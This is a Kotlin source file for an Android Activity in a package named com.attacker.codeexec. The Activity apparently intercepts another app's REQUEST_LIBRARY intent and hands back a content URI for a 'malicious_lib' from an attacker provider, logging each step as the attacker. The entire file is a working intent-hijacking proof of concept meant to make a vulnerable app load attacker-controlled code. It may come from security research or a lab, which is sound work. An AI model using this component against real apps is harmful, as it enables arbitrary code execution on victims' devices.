package com.attacker.codeexec

import android.app.Activity
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.util.Log

class EvilContentActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val maliciousUri = Uri.parse("content://com.attacker.evil/malicious_lib")

        Log.w("ATTACKER", "Intercepted REQUEST_LIBRARY intent!")
        Log.w("ATTACKER", "Returning malicious content URI: $maliciousUri")

        setResult(RESULT_OK, Intent().apply {
            data = maliciousUri
        })

        finish()
    }
}
